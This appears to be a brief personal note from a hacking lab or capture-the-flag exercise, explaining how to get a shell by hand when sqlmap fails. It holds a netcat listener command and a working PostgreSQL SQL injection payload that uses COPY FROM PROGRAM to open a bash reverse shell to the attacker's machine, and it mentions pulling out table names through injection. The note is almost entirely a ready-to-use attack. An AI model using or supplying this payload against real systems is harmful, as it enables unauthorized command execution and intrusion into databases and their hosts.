---
title: SqlMap
updated: 2023-10-31 11:58:42Z
created: 2023-10-31 11:57:59Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---



For those who are still can’t get sqlmap to work here is a manual method to spawn a shell.
Listener:
`nc -nvlp 7777`

Payload:
`'; COPY cars FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/{YOUR_IP}/7777 0>&1"' --`

YOUR_IP is your machines ip (if using open vpn use tun0 interface’s ip)
Note: cars here is valid table in database. Database schema and table names can be exfiltrated through various SQLI techniques





